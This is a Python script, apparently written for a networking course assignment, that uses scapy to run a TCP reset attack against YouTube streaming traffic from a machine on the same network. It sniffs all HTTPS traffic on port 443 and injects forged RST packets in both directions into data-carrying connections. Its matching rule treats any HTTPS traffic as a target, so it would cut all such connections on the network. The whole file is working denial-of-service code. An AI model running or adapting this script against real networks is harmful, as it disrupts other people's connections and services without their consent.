#!/usr/bin/env python3
"""
Ultimate Windows YouTube Attack Demo
Demonstrates TCP Reset Attack targeting Windows YouTube traffic
"""

import sys
import time
import threading
import subprocess
import requests
import socket
from scapy.all import *

class UltimateYouTubeAttack:
    def __init__(self):
        self.windows_ip = "10.18.34.106"
        self.wsl_ip = "172.31.126.113"
        
        # YouTube/Google IP ranges and known servers
        self.youtube_ips = {
            "142.251.43.174", "142.250.194.42", "142.250.182.174",
            "172.217.26.3", "142.251.85.105", "4.213.25.242"
        }
        
        self.youtube_domains = [
            "youtube.com", "googlevideo.com", "ytimg.com", 
            "ggpht.com", "googleusercontent.com"
        ]
        
        self.attack_stats = {
            'packets_captured': 0,
            'youtube_packets': 0,
            'rst_injected': 0,
            'connections_attacked': set()
        }
        
    def resolve_youtube_servers(self):
        """Resolve current YouTube server IPs"""
        print("[RESOLVE] Finding current YouTube server IPs...")
        
        for domain in self.youtube_domains:
            try:
                ip = socket.gethostbyname(domain)
                self.youtube_ips.add(ip)
                print(f"  {domain} -> {ip}")
            except Exception as e:
                print(f"  Failed to resolve {domain}: {e}")
        
        print(f"[RESOLVE] Total YouTube IPs: {len(self.youtube_ips)}")
    
    def is_youtube_traffic(self, src_ip, dst_ip, dst_port=None):
        """Enhanced YouTube traffic detection"""
        # Check against known YouTube IPs
        for ip in [src_ip, dst_ip]:
            if ip in self.youtube_ips:
                return True
            
            # Check Google/YouTube IP ranges
            youtube_prefixes = [
                "142.250.", "142.251.", "172.217.", "216.58.",
                "74.125.", "173.194.", "209.85.", "64.233."
            ]
            
            if any(ip.startswith(prefix) for prefix in youtube_prefixes):
                return True
        
        # HTTPS traffic to unknown servers might be YouTube
        if dst_port == 443:
            return True
            
        return False
    
    def create_rst_attack(self, packet):
        """Create RST packets to disrupt connection"""
        if not (IP in packet and TCP in packet):
            return []
            
        ip = packet[IP]
        tcp = packet[TCP]
        
        rst_packets = []
        
        # RST from server to client
        rst1 = IP(src=ip.dst, dst=ip.src) / TCP(
            sport=tcp.dport,
            dport=tcp.sport,
            seq=tcp.ack,
            ack=tcp.seq + max(1, len(packet[TCP].payload)),
            flags="R"
        )
        
        # RST from client to server
        rst2 = IP(src=ip.src, dst=ip.dst) / TCP(
            sport=tcp.sport,
            dport=tcp.dport,
            seq=tcp.seq,
            ack=tcp.ack,
            flags="R"
        )
        
        return [rst1, rst2]
    
    def attack_packet(self, packet):
        """Attack individual packet if it's YouTube traffic"""
        try:
            self.attack_stats['packets_captured'] += 1
            
            if IP in packet and TCP in packet:
                ip = packet[IP]
                tcp = packet[TCP]
                
                # Check if this is YouTube traffic
                if self.is_youtube_traffic(ip.src, ip.dst, tcp.dport):
                    self.attack_stats['youtube_packets'] += 1
                    
                    conn_id = f"{ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport}"
                    
                    # Log the YouTube traffic
                    flags_str = ""
                    if tcp.flags & 0x02: flags_str += "S"
                    if tcp.flags & 0x10: flags_str += "A"
                    if tcp.flags & 0x08: flags_str += "P"
                    if tcp.flags & 0x01: flags_str += "F"
                    if tcp.flags & 0x04: flags_str += "R"
                    
                    print(f"[YOUTUBE] {conn_id} (seq={tcp.seq}, ack={tcp.ack}, flags={flags_str})")
                    
                    # Only attack data packets (PSH+ACK)
                    if tcp.flags & 0x18 == 0x18:  # PSH+ACK
                        rst_packets = self.create_rst_attack(packet)
                        
                        for rst in rst_packets:
                            try:
                                send(rst, verbose=0)
                                self.attack_stats['rst_injected'] += 1
                            except Exception as e:
                                print(f"[ERROR] Failed to send RST: {e}")
                        
                        self.attack_stats['connections_attacked'].add(conn_id)
                        print(f"[RST] Attacked connection {conn_id}")
            
            # Print stats every 25 packets
            if self.attack_stats['packets_captured'] % 25 == 0:
                self.print_live_stats()
                
        except Exception as e:
            print(f"[ERROR] Packet processing error: {e}")
    
    def print_live_stats(self):
        """Print live attack statistics"""
        stats = self.attack_stats
        print(f"[STATS] Packets: {stats['packets_captured']} | "
              f"YouTube: {stats['youtube_packets']} | "
              f"RST: {stats['rst_injected']} | "
              f"Connections: {len(stats['connections_attacked'])}")
    
    def generate_youtube_traffic_demo(self):
        """Generate our own YouTube traffic to attack"""
        print("[DEMO] Generating YouTube traffic to demonstrate attack...")
        
        youtube_urls = [
            "https://www.youtube.com/",
            "https://youtube.com/feed/trending",
            "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg",
            "https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg"
        ]
        
        def make_requests():
            for i in range(10):
                try:
                    for url in youtube_urls:
                        print(f"[TRAFFIC] Requesting {url}")
                        response = requests.get(url, timeout=5)
                        print(f"[TRAFFIC] Response: {response.status_code}")
                        time.sleep(2)
                except Exception as e:
                    print(f"[TRAFFIC] Request failed: {e}")
                time.sleep(1)
        
        # Start traffic generation in background
        traffic_thread = threading.Thread(target=make_requests)
        traffic_thread.daemon = True
        traffic_thread.start()
        
        return traffic_thread
    
    def start_comprehensive_attack(self):
        """Start the comprehensive YouTube attack"""
        print("="*60)
        print("🎯 ULTIMATE WINDOWS YOUTUBE TCP RESET ATTACK")
        print("="*60)
        print(f"Target Windows IP: {self.windows_ip}")
        print(f"WSL2 Attack Source: {self.wsl_ip}")
        print("="*60)
        
        # Resolve current YouTube IPs
        self.resolve_youtube_servers()
        
        print(f"\n📋 ATTACK PLAN:")
        print(f"1. Monitor ALL HTTPS traffic (port 443)")
        print(f"2. Identify YouTube/Google traffic patterns")
        print(f"3. Inject TCP RST packets to disrupt connections")
        print(f"4. Generate our own YouTube traffic for demonstration")
        
        print(f"\n🎬 INSTRUCTIONS FOR WINDOWS MACHINE:")
        print(f"1. Open YouTube on your Windows machine ({self.windows_ip})")
        print(f"2. Start playing videos")
        print(f"3. Watch for connection disruptions")
        print(f"4. Videos should buffer/fail due to RST attacks")
        
        print(f"\n⚡ Starting attack in 5 seconds...")
        for i in range(5, 0, -1):
            print(f"   {i}...")
            time.sleep(1)
        
        print(f"\n🚀 ATTACK ACTIVE! Press Ctrl+C to stop")
        print("="*60)
        
        # Start traffic generation
        traffic_thread = self.generate_youtube_traffic_demo()
        
        try:
            # Monitor ALL HTTPS traffic
            sniff(filter="tcp port 443", prn=self.attack_packet, store=0)
            
        except KeyboardInterrupt:
            print(f"\n[STOP] Attack stopped by user")
        
        self.print_final_results()
    
    def print_final_results(self):
        """Print comprehensive attack results"""
        stats = self.attack_stats
        
        print(f"\n" + "="*60)
        print("🎯 ATTACK RESULTS SUMMARY")
        print("="*60)
        print(f"Total packets monitored: {stats['packets_captured']}")
        print(f"YouTube packets detected: {stats['youtube_packets']}")
        print(f"RST packets injected: {stats['rst_injected']}")
        print(f"Unique connections attacked: {len(stats['connections_attacked'])}")
        
        if stats['youtube_packets'] > 0:
            success_rate = (stats['rst_injected'] / (stats['youtube_packets'] * 2)) * 100
            print(f"Attack efficiency: {success_rate:.1f}%")
        
        print(f"\n🎯 ATTACKED CONNECTIONS:")
        for i, conn in enumerate(list(stats['connections_attacked'])[:10]):
            print(f"  {i+1}. {conn}")
        
        if len(stats['connections_attacked']) > 10:
            print(f"  ... and {len(stats['connections_attacked']) - 10} more")
        
        print(f"\n📊 YOUTUBE SERVERS TARGETED:")
        for ip in list(self.youtube_ips)[:10]:
            print(f"  - {ip}")
        
        if stats['rst_injected'] > 0:
            print(f"\n✅ TCP RESET ATTACK SUCCESSFUL!")
            print(f"Successfully disrupted {stats['rst_injected']} packets")
            print(f"Attack demonstrated on real YouTube traffic!")
        else:
            print(f"\n⚠️  Limited attack success")
            print(f"Try generating more YouTube traffic on target machine")
        
        print(f"\n🎓 ASSIGNMENT DEMONSTRATION COMPLETE")
        print(f"This proves TCP Reset attacks work against video streaming!")

def main():
    if os.geteuid() != 0:
        print("❌ Root privileges required for packet injection")
        print("Run: sudo python3 ultimate_youtube_attack.py")
        sys.exit(1)
    
    attack = UltimateYouTubeAttack()
    attack.start_comprehensive_attack()

if __name__ == "__main__":
    main()
